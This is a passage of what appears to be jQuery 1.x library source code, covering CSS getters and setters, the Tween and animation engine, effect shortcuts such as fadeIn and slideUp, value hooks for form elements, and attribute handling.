                    if (display && display !== "none" || !hidden) {
                        jQuery._data(elem, "olddisplay", hidden ? display : jQuery.css(elem, "display"))
                    }
                }
            }
            for (index = 0; index < length; index++) {
                elem = elements[index];
                if (!elem.style) {
                    continue
                }
                if (!show || elem.style.display === "none" || elem.style.display === "") {
                    elem.style.display = show ? values[index] || "" : "none"
                }
            }
            return elements
        }

        function setPositiveNumber(elem, value, subtract) {
            var matches = rnumsplit.exec(value);
            return matches ? Math.max(0, matches[1] - (subtract || 0)) + (matches[2] || "px") : value
        }

        function augmentWidthOrHeight(elem, name, extra, isBorderBox, styles) {
            var i = extra === (isBorderBox ? "border" : "content") ? 4 : name === "width" ? 1 : 0,
                val = 0;
            for (; i < 4; i += 2) {
                if (extra === "margin") {
                    val += jQuery.css(elem, extra + cssExpand[i], true, styles)
                }
                if (isBorderBox) {
                    if (extra === "content") {
                        val -= jQuery.css(elem, "padding" + cssExpand[i], true, styles)
                    }
                    if (extra !== "margin") {
                        val -= jQuery.css(elem, "border" + cssExpand[i] + "Width", true, styles)
                    }
                } else {
                    val += jQuery.css(elem, "padding" + cssExpand[i], true, styles);
                    if (extra !== "padding") {
                        val += jQuery.css(elem, "border" + cssExpand[i] + "Width", true, styles)
                    }
                }
            }
            return val
        }

        function getWidthOrHeight(elem, name, extra) {
            var valueIsBorderBox = true,
                val = name === "width" ? elem.offsetWidth : elem.offsetHeight,
                styles = getStyles(elem),
                isBorderBox = support.boxSizing && jQuery.css(elem, "boxSizing", false, styles) === "border-box";
            if (val <= 0 || val == null) {
                val = curCSS(elem, name, styles);
                if (val < 0 || val == null) {
                    val = elem.style[name]
                }
                if (rnumnonpx.test(val)) {
                    return val
                }
                valueIsBorderBox = isBorderBox && (support.boxSizingReliable() || val === elem.style[name]);
                val = parseFloat(val) || 0
            }
            return (val + augmentWidthOrHeight(elem, name, extra || (isBorderBox ? "border" : "content"), valueIsBorderBox, styles)) + "px"
        }
        jQuery.extend({
            cssHooks: {
                opacity: {
                    get: function(elem, computed) {
                        if (computed) {
                            var ret = curCSS(elem, "opacity");
                            return ret === "" ? "1" : ret
                        }
                    }
                }
            },
            cssNumber: {
                "columnCount": true,
                "fillOpacity": true,
                "flexGrow": true,
                "flexShrink": true,
                "fontWeight": true,
                "lineHeight": true,
                "opacity": true,
                "order": true,
                "orphans": true,
                "widows": true,
                "zIndex": true,
                "zoom": true
            },
            cssProps: {
                "float": support.cssFloat ? "cssFloat" : "styleFloat"
            },
            style: function(elem, name, value, extra) {
                if (!elem || elem.nodeType === 3 || elem.nodeType === 8 || !elem.style) {
                    return
                }
                var ret, type, hooks, origName = jQuery.camelCase(name),
                    style = elem.style;
                name = jQuery.cssProps[origName] || (jQuery.cssProps[origName] = vendorPropName(style, origName));
                hooks = jQuery.cssHooks[name] || jQuery.cssHooks[origName];
                if (value !== undefined) {
                    type = typeof value;
                    if (type === "string" && (ret = rrelNum.exec(value))) {
                        value = (ret[1] + 1) * ret[2] + parseFloat(jQuery.css(elem, name));
                        type = "number"
                    }
                    if (value == null || value !== value) {
                        return
                    }
                    if (type === "number" && !jQuery.cssNumber[origName]) {
                        value += "px"
                    }
                    if (!support.clearCloneStyle && value === "" && name.indexOf("background") === 0) {
                        style[name] = "inherit"
                    }
                    if (!hooks || !("set" in hooks) || (value = hooks.set(elem, value, extra)) !== undefined) {
                        try {
                            style[name] = value
                        } catch (e) {}
                    }
                } else {
                    if (hooks && "get" in hooks && (ret = hooks.get(elem, false, extra)) !== undefined) {
                        return ret
                    }
                    return style[name]
                }
            },
            css: function(elem, name, extra, styles) {
                var num, val, hooks, origName = jQuery.camelCase(name);
                name = jQuery.cssProps[origName] || (jQuery.cssProps[origName] = vendorPropName(elem.style, origName));
                hooks = jQuery.cssHooks[name] || jQuery.cssHooks[origName];
                if (hooks && "get" in hooks) {
                    val = hooks.get(elem, true, extra)
                }
                if (val === undefined) {
                    val = curCSS(elem, name, styles)
                }
                if (val === "normal" && name in cssNormalTransform) {
                    val = cssNormalTransform[name]
                }
                if (extra === "" || extra) {
                    num = parseFloat(val);
                    return extra === true || jQuery.isNumeric(num) ? num || 0 : val
                }
                return val
            }
        });
        jQuery.each(["height", "width"], function(i, name) {
            jQuery.cssHooks[name] = {
                get: function(elem, computed, extra) {
                    if (computed) {
                        return rdisplayswap.test(jQuery.css(elem, "display")) && elem.offsetWidth === 0 ? jQuery.swap(elem, cssShow, function() {
                            return getWidthOrHeight(elem, name, extra)
                        }) : getWidthOrHeight(elem, name, extra)
                    }
                },
                set: function(elem, value, extra) {
                    var styles = extra && getStyles(elem);
                    return setPositiveNumber(elem, value, extra ? augmentWidthOrHeight(elem, name, extra, support.boxSizing && jQuery.css(elem, "boxSizing", false, styles) === "border-box", styles) : 0)
                }
            }
        });
        if (!support.opacity) {
            jQuery.cssHooks.opacity = {
                get: function(elem, computed) {
                    return ropacity.test((computed && elem.currentStyle ? elem.currentStyle.filter : elem.style.filter) || "") ? (0.01 * parseFloat(RegExp.$1)) + "" : computed ? "1" : ""
                },
                set: function(elem, value) {
                    var style = elem.style,
                        currentStyle = elem.currentStyle,
                        opacity = jQuery.isNumeric(value) ? "alpha(opacity=" + value * 100 + ")" : "",
                        filter = currentStyle && currentStyle.filter || style.filter || "";
                    style.zoom = 1;
                    if ((value >= 1 || value === "") && jQuery.trim(filter.replace(ralpha, "")) === "" && style.removeAttribute) {
                        style.removeAttribute("filter");
                        if (value === "" || currentStyle && !currentStyle.filter) {
                            return
                        }
                    }
                    style.filter = ralpha.test(filter) ? filter.replace(ralpha, opacity) : filter + " " + opacity
                }
            }
        }
        jQuery.cssHooks.marginRight = addGetHookIf(support.reliableMarginRight, function(elem, computed) {
            if (computed) {
                return jQuery.swap(elem, {
                    "display": "inline-block"
                }, curCSS, [elem, "marginRight"])
            }
        });
        jQuery.each({
            margin: "",
            padding: "",
            border: "Width"
        }, function(prefix, suffix) {
            jQuery.cssHooks[prefix + suffix] = {
                expand: function(value) {
                    var i = 0,
                        expanded = {},
                        parts = typeof value === "string" ? value.split(" ") : [value];
                    for (; i < 4; i++) {
                        expanded[prefix + cssExpand[i] + suffix] = parts[i] || parts[i - 2] || parts[0]
                    }
                    return expanded
                }
            };
            if (!rmargin.test(prefix)) {
                jQuery.cssHooks[prefix + suffix].set = setPositiveNumber
            }
        });
        jQuery.fn.extend({
            css: function(name, value) {
                return access(this, function(elem, name, value) {
                    var styles, len, map = {},
                        i = 0;
                    if (jQuery.isArray(name)) {
                        styles = getStyles(elem);
                        len = name.length;
                        for (; i < len; i++) {
                            map[name[i]] = jQuery.css(elem, name[i], false, styles)
                        }
                        return map
                    }
                    return value !== undefined ? jQuery.style(elem, name, value) : jQuery.css(elem, name)
                }, name, value, arguments.length > 1)
            },
            show: function() {
                return showHide(this, true)
            },
            hide: function() {
                return showHide(this)
            },
            toggle: function(state) {
                if (typeof state === "boolean") {
                    return state ? this.show() : this.hide()
                }
                return this.each(function() {
                    if (isHidden(this)) {
                        jQuery(this).show()
                    } else {
                        jQuery(this).hide()
                    }
                })
            }
        });

        function Tween(elem, options, prop, end, easing) {
            return new Tween.prototype.init(elem, options, prop, end, easing)
        }
        jQuery.Tween = Tween;
        Tween.prototype = {
            constructor: Tween,
            init: function(elem, options, prop, end, easing, unit) {
                this.elem = elem;
                this.prop = prop;
                this.easing = easing || "swing";
                this.options = options;
                this.start = this.now = this.cur();
                this.end = end;
                this.unit = unit || (jQuery.cssNumber[prop] ? "" : "px")
            },
            cur: function() {
                var hooks = Tween.propHooks[this.prop];
                return hooks && hooks.get ? hooks.get(this) : Tween.propHooks._default.get(this)
            },
            run: function(percent) {
                var eased, hooks = Tween.propHooks[this.prop];
                if (this.options.duration) {
                    this.pos = eased = jQuery.easing[this.easing](percent, this.options.duration * percent, 0, 1, this.options.duration)
                } else {
                    this.pos = eased = percent
                }
                this.now = (this.end - this.start) * eased + this.start;
                if (this.options.step) {
                    this.options.step.call(this.elem, this.now, this)
                }
                if (hooks && hooks.set) {
                    hooks.set(this)
                } else {
                    Tween.propHooks._default.set(this)
                }
                return this
            }
        };
        Tween.prototype.init.prototype = Tween.prototype;
        Tween.propHooks = {
            _default: {
                get: function(tween) {
                    var result;
                    if (tween.elem[tween.prop] != null && (!tween.elem.style || tween.elem.style[tween.prop] == null)) {
                        return tween.elem[tween.prop]
                    }
                    result = jQuery.css(tween.elem, tween.prop, "");
                    return !result || result === "auto" ? 0 : result
                },
                set: function(tween) {
                    if (jQuery.fx.step[tween.prop]) {
                        jQuery.fx.step[tween.prop](tween)
                    } else if (tween.elem.style && (tween.elem.style[jQuery.cssProps[tween.prop]] != null || jQuery.cssHooks[tween.prop])) {
                        jQuery.style(tween.elem, tween.prop, tween.now + tween.unit)
                    } else {
                        tween.elem[tween.prop] = tween.now
                    }
                }
            }
        };
        Tween.propHooks.scrollTop = Tween.propHooks.scrollLeft = {
            set: function(tween) {
                if (tween.elem.nodeType && tween.elem.parentNode) {
                    tween.elem[tween.prop] = tween.now
                }
            }
        };
        jQuery.easing = {
            linear: function(p) {
                return p
            },
            swing: function(p) {
                return 0.5 - Math.cos(p * Math.PI) / 2
            }
        };
        jQuery.fx = Tween.prototype.init;
        jQuery.fx.step = {};
        var fxNow, timerId, rfxtypes = /^(?:toggle|show|hide)$/,
            rfxnum = new RegExp("^(?:([+-])=|)(" + pnum + ")([a-z%]*)$", "i"),
            rrun = /queueHooks$/,
            animationPrefilters = [defaultPrefilter],
            tweeners = {
                "*": [function(prop, value) {
                    var tween = this.createTween(prop, value),
                        target = tween.cur(),
                        parts = rfxnum.exec(value),
                        unit = parts && parts[3] || (jQuery.cssNumber[prop] ? "" : "px"),
                        start = (jQuery.cssNumber[prop] || unit !== "px" && +target) && rfxnum.exec(jQuery.css(tween.elem, prop)),
                        scale = 1,
                        maxIterations = 20;
                    if (start && start[3] !== unit) {
                        unit = unit || start[3];
                        parts = parts || [];
                        start = +target || 1;
                        do {
                            scale = scale || ".5";
                            start = start / scale;
                            jQuery.style(tween.elem, prop, start + unit)
                        } while (scale !== (scale = tween.cur() / target) && scale !== 1 && --maxIterations)
                    }
                    if (parts) {
                        start = tween.start = +start || +target || 0;
                        tween.unit = unit;
                        tween.end = parts[1] ? start + (parts[1] + 1) * parts[2] : +parts[2]
                    }
                    return tween
                }]
            };

        function createFxNow() {
            setTimeout(function() {
                fxNow = undefined
            });
            return (fxNow = jQuery.now())
        }

        function genFx(type, includeWidth) {
            var which, attrs = {
                    height: type
                },
                i = 0;
            includeWidth = includeWidth ? 1 : 0;
            for (; i < 4; i += 2 - includeWidth) {
                which = cssExpand[i];
                attrs["margin" + which] = attrs["padding" + which] = type
            }
            if (includeWidth) {
                attrs.opacity = attrs.width = type
            }
            return attrs
        }

        function createTween(value, prop, animation) {
            var tween, collection = (tweeners[prop] || []).concat(tweeners["*"]),
                index = 0,
                length = collection.length;
            for (; index < length; index++) {
                if ((tween = collection[index].call(animation, prop, value))) {
                    return tween
                }
            }
        }

        function defaultPrefilter(elem, props, opts) {
            var prop, value, toggle, tween, hooks, oldfire, display, checkDisplay, anim = this,
                orig = {},
                style = elem.style,
                hidden = elem.nodeType && isHidden(elem),
                dataShow = jQuery._data(elem, "fxshow");
            if (!opts.queue) {
                hooks = jQuery._queueHooks(elem, "fx");
                if (hooks.unqueued == null) {
                    hooks.unqueued = 0;
                    oldfire = hooks.empty.fire;
                    hooks.empty.fire = function() {
                        if (!hooks.unqueued) {
                            oldfire()
                        }
                    }
                }
                hooks.unqueued++;
                anim.always(function() {
                    anim.always(function() {
                        hooks.unqueued--;
                        if (!jQuery.queue(elem, "fx").length) {
                            hooks.empty.fire()
                        }
                    })
                })
            }
            if (elem.nodeType === 1 && ("height" in props || "width" in props)) {
                opts.overflow = [style.overflow, style.overflowX, style.overflowY];
                display = jQuery.css(elem, "display");
                checkDisplay = display === "none" ? jQuery._data(elem, "olddisplay") || defaultDisplay(elem.nodeName) : display;
                if (checkDisplay === "inline" && jQuery.css(elem, "float") === "none") {
                    if (!support.inlineBlockNeedsLayout || defaultDisplay(elem.nodeName) === "inline") {
                        style.display = "inline-block"
                    } else {
                        style.zoom = 1
                    }
                }
            }
            if (opts.overflow) {
                style.overflow = "hidden";
                if (!support.shrinkWrapBlocks()) {
                    anim.always(function() {
                        style.overflow = opts.overflow[0];
                        style.overflowX = opts.overflow[1];
                        style.overflowY = opts.overflow[2]
                    })
                }
            }
            for (prop in props) {
                value = props[prop];
                if (rfxtypes.exec(value)) {
                    delete props[prop];
                    toggle = toggle || value === "toggle";
                    if (value === (hidden ? "hide" : "show")) {
                        if (value === "show" && dataShow && dataShow[prop] !== undefined) {
                            hidden = true
                        } else {
                            continue
                        }
                    }
                    orig[prop] = dataShow && dataShow[prop] || jQuery.style(elem, prop)
                } else {
                    display = undefined
                }
            }
            if (!jQuery.isEmptyObject(orig)) {
                if (dataShow) {
                    if ("hidden" in dataShow) {
                        hidden = dataShow.hidden
                    }
                } else {
                    dataShow = jQuery._data(elem, "fxshow", {})
                }
                if (toggle) {
                    dataShow.hidden = !hidden
                }
                if (hidden) {
                    jQuery(elem).show()
                } else {
                    anim.done(function() {
                        jQuery(elem).hide()
                    })
                }
                anim.done(function() {
                    var prop;
                    jQuery._removeData(elem, "fxshow");
                    for (prop in orig) {
                        jQuery.style(elem, prop, orig[prop])
                    }
                });
                for (prop in orig) {
                    tween = createTween(hidden ? dataShow[prop] : 0, prop, anim);
                    if (!(prop in dataShow)) {
                        dataShow[prop] = tween.start;
                        if (hidden) {
                            tween.end = tween.start;
                            tween.start = prop === "width" || prop === "height" ? 1 : 0
                        }
                    }
                }
            } else if ((display === "none" ? defaultDisplay(elem.nodeName) : display) === "inline") {
                style.display = display
            }
        }

        function propFilter(props, specialEasing) {
            var index, name, easing, value, hooks;
            for (index in props) {
                name = jQuery.camelCase(index);
                easing = specialEasing[name];
                value = props[index];
                if (jQuery.isArray(value)) {
                    easing = value[1];
                    value = props[index] = value[0]
                }
                if (index !== name) {
                    props[name] = value;
                    delete props[index]
                }
                hooks = jQuery.cssHooks[name];
                if (hooks && "expand" in hooks) {
                    value = hooks.expand(value);
                    delete props[name];
                    for (index in value) {
                        if (!(index in props)) {
                            props[index] = value[index];
                            specialEasing[index] = easing
                        }
                    }
                } else {
                    specialEasing[name] = easing
                }
            }
        }

        function Animation(elem, properties, options) {
            var result, stopped, index = 0,
                length = animationPrefilters.length,
                deferred = jQuery.Deferred().always(function() {
                    delete tick.elem
                }),
                tick = function() {
                    if (stopped) {
                        return false
                    }
                    var currentTime = fxNow || createFxNow(),
                        remaining = Math.max(0, animation.startTime + animation.duration - currentTime),
                        temp = remaining / animation.duration || 0,
                        percent = 1 - temp,
                        index = 0,
                        length = animation.tweens.length;
                    for (; index < length; index++) {
                        animation.tweens[index].run(percent)
                    }
                    deferred.notifyWith(elem, [animation, percent, remaining]);
                    if (percent < 1 && length) {
                        return remaining
                    } else {
                        deferred.resolveWith(elem, [animation]);
                        return false
                    }
                },
                animation = deferred.promise({
                    elem: elem,
                    props: jQuery.extend({}, properties),
                    opts: jQuery.extend(true, {
                        specialEasing: {}
                    }, options),
                    originalProperties: properties,
                    originalOptions: options,
                    startTime: fxNow || createFxNow(),
                    duration: options.duration,
                    tweens: [],
                    createTween: function(prop, end) {
                        var tween = jQuery.Tween(elem, animation.opts, prop, end, animation.opts.specialEasing[prop] || animation.opts.easing);
                        animation.tweens.push(tween);
                        return tween
                    },
                    stop: function(gotoEnd) {
                        var index = 0,
                            length = gotoEnd ? animation.tweens.length : 0;
                        if (stopped) {
                            return this
                        }
                        stopped = true;
                        for (; index < length; index++) {
                            animation.tweens[index].run(1)
                        }
                        if (gotoEnd) {
                            deferred.resolveWith(elem, [animation, gotoEnd])
                        } else {
                            deferred.rejectWith(elem, [animation, gotoEnd])
                        }
                        return this
                    }
                }),
                props = animation.props;
            propFilter(props, animation.opts.specialEasing);
            for (; index < length; index++) {
                result = animationPrefilters[index].call(animation, elem, props, animation.opts);
                if (result) {
                    return result
                }
            }
            jQuery.map(props, createTween, animation);
            if (jQuery.isFunction(animation.opts.start)) {
                animation.opts.start.call(elem, animation)
            }
            jQuery.fx.timer(jQuery.extend(tick, {
                elem: elem,
                anim: animation,
                queue: animation.opts.queue
            }));
            return animation.progress(animation.opts.progress).done(animation.opts.done, animation.opts.complete).fail(animation.opts.fail).always(animation.opts.always)
        }
        jQuery.Animation = jQuery.extend(Animation, {
            tweener: function(props, callback) {
                if (jQuery.isFunction(props)) {
                    callback = props;
                    props = ["*"]
                } else {
                    props = props.split(" ")
                }
                var prop, index = 0,
                    length = props.length;
                for (; index < length; index++) {
                    prop = props[index];
                    tweeners[prop] = tweeners[prop] || [];
                    tweeners[prop].unshift(callback)
                }
            },
            prefilter: function(callback, prepend) {
                if (prepend) {
                    animationPrefilters.unshift(callback)
                } else {
                    animationPrefilters.push(callback)
                }
            }
        });
        jQuery.speed = function(speed, easing, fn) {
            var opt = speed && typeof speed === "object" ? jQuery.extend({}, speed) : {
                complete: fn || !fn && easing || jQuery.isFunction(speed) && speed,
                duration: speed,
                easing: fn && easing || easing && !jQuery.isFunction(easing) && easing
            };
            opt.duration = jQuery.fx.off ? 0 : typeof opt.duration === "number" ? opt.duration : opt.duration in jQuery.fx.speeds ? jQuery.fx.speeds[opt.duration] : jQuery.fx.speeds._default;
            if (opt.queue == null || opt.queue === true) {
                opt.queue = "fx"
            }
            opt.old = opt.complete;
            opt.complete = function() {
                if (jQuery.isFunction(opt.old)) {
                    opt.old.call(this)
                }
                if (opt.queue) {
                    jQuery.dequeue(this, opt.queue)
                }
            };
            return opt
        };
        jQuery.fn.extend({
            fadeTo: function(speed, to, easing, callback) {
                return this.filter(isHidden).css("opacity", 0).show().end().animate({
                    opacity: to
                }, speed, easing, callback)
            },
            animate: function(prop, speed, easing, callback) {
                var empty = jQuery.isEmptyObject(prop),
                    optall = jQuery.speed(speed, easing, callback),
                    doAnimation = function() {
                        var anim = Animation(this, jQuery.extend({}, prop), optall);
                        if (empty || jQuery._data(this, "finish")) {
                            anim.stop(true)
                        }
                    };
                doAnimation.finish = doAnimation;
                return empty || optall.queue === false ? this.each(doAnimation) : this.queue(optall.queue, doAnimation)
            },
            stop: function(type, clearQueue, gotoEnd) {
                var stopQueue = function(hooks) {
                    var stop = hooks.stop;
                    delete hooks.stop;
                    stop(gotoEnd)
                };
                if (typeof type !== "string") {
                    gotoEnd = clearQueue;
                    clearQueue = type;
                    type = undefined
                }
                if (clearQueue && type !== false) {
                    this.queue(type || "fx", [])
                }
                return this.each(function() {
                    var dequeue = true,
                        index = type != null && type + "queueHooks",
                        timers = jQuery.timers,
                        data = jQuery._data(this);
                    if (index) {
                        if (data[index] && data[index].stop) {
                            stopQueue(data[index])
                        }
                    } else {
                        for (index in data) {
                            if (data[index] && data[index].stop && rrun.test(index)) {
                                stopQueue(data[index])
                            }
                        }
                    }
                    for (index = timers.length; index--;) {
                        if (timers[index].elem === this && (type == null || timers[index].queue === type)) {
                            timers[index].anim.stop(gotoEnd);
                            dequeue = false;
                            timers.splice(index, 1)
                        }
                    }
                    if (dequeue || !gotoEnd) {
                        jQuery.dequeue(this, type)
                    }
                })
            },
            finish: function(type) {
                if (type !== false) {
                    type = type || "fx"
                }
                return this.each(function() {
                    var index, data = jQuery._data(this),
                        queue = data[type + "queue"],
                        hooks = data[type + "queueHooks"],
                        timers = jQuery.timers,
                        length = queue ? queue.length : 0;
                    data.finish = true;
                    jQuery.queue(this, type, []);
                    if (hooks && hooks.stop) {
                        hooks.stop.call(this, true)
                    }
                    for (index = timers.length; index--;) {
                        if (timers[index].elem === this && timers[index].queue === type) {
                            timers[index].anim.stop(true);
                            timers.splice(index, 1)
                        }
                    }
                    for (index = 0; index < length; index++) {
                        if (queue[index] && queue[index].finish) {
                            queue[index].finish.call(this)
                        }
                    }
                    delete data.finish
                })
            }
        });
        jQuery.each(["toggle", "show", "hide"], function(i, name) {
            var cssFn = jQuery.fn[name];
            jQuery.fn[name] = function(speed, easing, callback) {
                return speed == null || typeof speed === "boolean" ? cssFn.apply(this, arguments) : this.animate(genFx(name, true), speed, easing, callback)
            }
        });
        jQuery.each({
            slideDown: genFx("show"),
            slideUp: genFx("hide"),
            slideToggle: genFx("toggle"),
            fadeIn: {
                opacity: "show"
            },
            fadeOut: {
                opacity: "hide"
            },
            fadeToggle: {
                opacity: "toggle"
            }
        }, function(name, props) {
            jQuery.fn[name] = function(speed, easing, callback) {
                return this.animate(props, speed, easing, callback)
            }
        });
        jQuery.timers = [];
        jQuery.fx.tick = function() {
            var timer, timers = jQuery.timers,
                i = 0;
            fxNow = jQuery.now();
            for (; i < timers.length; i++) {
                timer = timers[i];
                if (!timer() && timers[i] === timer) {
                    timers.splice(i--, 1)
                }
            }
            if (!timers.length) {
                jQuery.fx.stop()
            }
            fxNow = undefined
        };
        jQuery.fx.timer = function(timer) {
            jQuery.timers.push(timer);
            if (timer()) {
                jQuery.fx.start()
            } else {
                jQuery.timers.pop()
            }
        };
        jQuery.fx.interval = 13;
        jQuery.fx.start = function() {
            if (!timerId) {
                timerId = setInterval(jQuery.fx.tick, jQuery.fx.interval)
            }
        };
        jQuery.fx.stop = function() {
            clearInterval(timerId);
            timerId = null
        };
        jQuery.fx.speeds = {
            slow: 600,
            fast: 200,
            _default: 400
        };
        jQuery.fn.delay = function(time, type) {
            time = jQuery.fx ? jQuery.fx.speeds[time] || time : time;
            type = type || "fx";
            return this.queue(type, function(next, hooks) {
                var timeout = setTimeout(next, time);
                hooks.stop = function() {
                    clearTimeout(timeout)
                }
            })
        };
        (function() {
            var input, div, select, a, opt;
            div = document.createElement("div");
            div.setAttribute("className", "t");
            div.innerHTML = "  <link/><table></table><a href='/a'>a</a><input type='checkbox'/>";
            a = div.getElementsByTagName("a")[0];
            select = document.createElement("select");
            opt = select.appendChild(document.createElement("option"));
            input = div.getElementsByTagName("input")[0];
            a.style.cssText = "top:1px";
            support.getSetAttribute = div.className !== "t";
            support.style = /top/.test(a.getAttribute("style"));
            support.hrefNormalized = a.getAttribute("href") === "/a";
            support.checkOn = !!input.value;
            support.optSelected = opt.selected;
            support.enctype = !!document.createElement("form").enctype;
            select.disabled = true;
            support.optDisabled = !opt.disabled;
            input = document.createElement("input");
            input.setAttribute("value", "");
            support.input = input.getAttribute("value") === "";
            input.value = "t";
            input.setAttribute("type", "radio");
            support.radioValue = input.value === "t"
        })();
        var rreturn = /\r/g;
        jQuery.fn.extend({
            val: function(value) {
                var hooks, ret, isFunction, elem = this[0];
                if (!arguments.length) {
                    if (elem) {
                        hooks = jQuery.valHooks[elem.type] || jQuery.valHooks[elem.nodeName.toLowerCase()];
                        if (hooks && "get" in hooks && (ret = hooks.get(elem, "value")) !== undefined) {
                            return ret
                        }
                        ret = elem.value;
                        return typeof ret === "string" ? ret.replace(rreturn, "") : ret == null ? "" : ret
                    }
                    return
                }
                isFunction = jQuery.isFunction(value);
                return this.each(function(i) {
                    var val;
                    if (this.nodeType !== 1) {
                        return
                    }
                    if (isFunction) {
                        val = value.call(this, i, jQuery(this).val())
                    } else {
                        val = value
                    }
                    if (val == null) {
                        val = ""
                    } else if (typeof val === "number") {
                        val += ""
                    } else if (jQuery.isArray(val)) {
                        val = jQuery.map(val, function(value) {
                            return value == null ? "" : value + ""
                        })
                    }
                    hooks = jQuery.valHooks[this.type] || jQuery.valHooks[this.nodeName.toLowerCase()];
                    if (!hooks || !("set" in hooks) || hooks.set(this, val, "value") === undefined) {
                        this.value = val
                    }
                })
            }
        });
        jQuery.extend({
            valHooks: {
                option: {
                    get: function(elem) {
                        var val = jQuery.find.attr(elem, "value");
                        return val != null ? val : jQuery.trim(jQuery.text(elem))
                    }
                },
                select: {
                    get: function(elem) {
                        var value, option, options = elem.options,
                            index = elem.selectedIndex,
                            one = elem.type === "select-one" || index < 0,
                            values = one ? null : [],
                            max = one ? index + 1 : options.length,
                            i = index < 0 ? max : one ? index : 0;
                        for (; i < max; i++) {
                            option = options[i];
                            if ((option.selected || i === index) && (support.optDisabled ? !option.disabled : option.getAttribute("disabled") === null) && (!option.parentNode.disabled || !jQuery.nodeName(option.parentNode, "optgroup"))) {
                                value = jQuery(option).val();
                                if (one) {
                                    return value
                                }
                                values.push(value)
                            }
                        }
                        return values
                    },
                    set: function(elem, value) {
                        var optionSet, option, options = elem.options,
                            values = jQuery.makeArray(value),
                            i = options.length;
                        while (i--) {
                            option = options[i];
                            if (jQuery.inArray(jQuery.valHooks.option.get(option), values) >= 0) {
                                try {
                                    option.selected = optionSet = true
                                } catch (_) {
                                    option.scrollHeight
                                }
                            } else {
                                option.selected = false
                            }
                        }
                        if (!optionSet) {
                            elem.selectedIndex = -1
                        }
                        return options
                    }
                }
            }
        });
        jQuery.each(["radio", "checkbox"], function() {
            jQuery.valHooks[this] = {
                set: function(elem, value) {
                    if (jQuery.isArray(value)) {
                        return (elem.checked = jQuery.inArray(jQuery(elem).val(), value) >= 0)
                    }
                }
            };
            if (!support.checkOn) {
                jQuery.valHooks[this].get = function(elem) {
                    return elem.getAttribute("value") === null ? "on" : elem.value
                }
            }
        });
        var nodeHook, boolHook, attrHandle = jQuery.expr.attrHandle,
            ruseDefault = /^(?:checked|selected)$/i,
            getSetAttribute = support.getSetAttribute,
            getSetInput = support.input;
        jQuery.fn.extend({
            attr: function(name, value) {
                return access(this, jQuery.attr, name, value, arguments.length > 1)
            },
            removeAttr: function(name) {
                return this.each(function() {
                    jQuery.removeAttr(this, name)
                })
            }
        });
        jQuery.extend({
            attr: function(elem, name, value) {
                var hooks, ret, nType = elem.nodeType;
                if (!elem || nType === 3 || nType === 8 || nType === 2) {
                    return
                }
                if (typeof elem.getAttribute === strundefined) {
                    return jQuery.prop(elem, name, value)
                }
                if (nType !== 1 || !jQuery.isXMLDoc(elem)) {
                    name = name.toLowerCase();
                    hooks = jQuery.attrHooks[name] || (jQuery.expr.match.bool.test(name) ? boolHook : nodeHook)
                }
                if (value !== undefined) {
                    if (value === null) {
                        jQuery.removeAttr(elem, name)
                    } else if (hooks && "set" in hooks && (ret = hooks.set(elem, value, name)) !== undefined) {
                        return ret
                    } else {
                        elem.setAttribute(name, value + "");
                        return value
                    }
                } else if (hooks && "get" in hooks && (ret = hooks.get(elem, name)) !== null) {
                    return ret
                } else {
                    ret = jQuery.find.attr(elem, name);
                    return ret == null ? undefined : ret
                }
            },
            removeAttr: function(elem, value) {
                var name, propName, i = 0,
                    attrNames = value && value.match(rnotwhite);
                if (attrNames && elem.nodeType === 1) {
                    while ((name = attrNames[i++])) {
                        propName = jQuery.propFix[name] || name;
                        if (jQuery.expr.match.bool.test(name)) {
                            if (getSetInput && getSetAttribute || !ruseDefault.test(name)) {
                                elem[propName] = false
                            } else {
                                elem[jQuery.camelCase("default-" + name)] = elem[propName] = false
                            }
                        } else {
                            jQuery.attr(elem, name, "")
                        }
                        elem.removeAttribute(getSetAttribute ? name : propName)
                    }
                }
            },
            attrHooks: {
                type: {
                    set: function(elem, value) {
                        if (!support.radioValue && value === "radio" && jQuery.nodeName(elem, "input")) {
                            var val = elem.value;
                            elem.setAttribute("type", value);
                            if (val) {
                                elem.value = val
                            }
                            return value
                        }
                    }
                }
            }
        });
        boolHook = {
            set: function(elem, value, name) {
                if (value === false) {
                    jQuery.removeAttr(elem, name)
                } else if (getSetInput && getSetAttribute || !ruseDefault.test(name)) {
                    elem.setAttribute(!getSetAttribute && jQuery.propFix[name] || name, name)
                } else {
                    elem[jQuery.camelCase("default-" + name)] = elem[name] = true
                }
                return name
            }
        };
        jQuery.each(jQuery.expr.match.bool.source.match(/\w+/g), function(i, name) {
            var getter = attrHandle[name] || jQuery.find.attr;
            attrHandle[name] = getSetInput && getSetAttribute || !ruseDefault.test(name) ? function(elem, name, isXML) {
                var ret, handle;
                if (!isXML) {
                    handle = attrHandle[name];
                    attrHandle[name] = ret;
                    ret = getter(elem, name, isXML) != null ? name.toLowerCase() : null;
                    attrHandle[name] = handle
                }
                return ret
            } : function(elem, name, isXML) {
                if (!isXML) {
                    return elem[jQuery.camelCase("default-" + name)] ? name.toLowerCase() : null
                }
            }
        });
        if (!getSetInput || !getSetAttribute) {
            jQuery.attrHooks.value = {
                set: function(elem, value, name) {
                    if (jQuery.nodeName(elem, "input")) {
                        elem.defaultValue = value
                    } else {
                        return nodeHook && nodeHook.set(elem, value, name)
                    }
                }
            }
        }
        if (!getSetAttribute) {
            nodeHook = {
                set: function(elem, value, name) {
                    var ret = elem.getAttributeNode(name);
                    if (!ret) {
                        elem.setAttributeNode((ret = elem.ownerDocument.createAttribute(name)))
                    }
                    ret.value = value += "";
                    if (name === "value" || value === elem.getAttribute(name)) {
                        return value
                    }
                }
            };
            attrHandle.id = attrHandle.name = attrHandle.coords = function(elem, name, isXML) {
                var ret;
                if (!isXML) {
                    return (ret = elem.getAttributeNode(name)) && ret.value !== "" ? ret.value : null
                }
            };
            jQuery.valHooks.button = {
                get: function(elem, name) {
                    var ret = elem.getAttributeNode(name);
                    if (ret && ret.specified) {
                        return ret.value
                    }
                },
                set: nodeHook.set
            };
            jQuery.attrHooks.contenteditable = {
                set: function(elem, value, name) {
                    nodeHook.set(elem, value === "" ? false : value, name)
                }
            };
            jQuery.each(["width", "height"], function(i, name) {
                jQuery.attrHooks[name] = {
                    set: function(elem, value) {
                        if (value === "") {
                            elem.setAttribute(name, "auto");
                            return value
                        }
                    }
                }
            })
        }
        if (!support.style) {
            jQuery.attrHooks.style = {
                get: function(elem) {
                    return elem.style.cssText || undefined
                },
                set: function(elem, value) {
                    return (elem.style.cssText = value + "")
                }
            }
        }
        var rfocusable = /^(?:input|select|textarea|button|object)$/i,
            rclickable = /^(?:a|area)$/i;
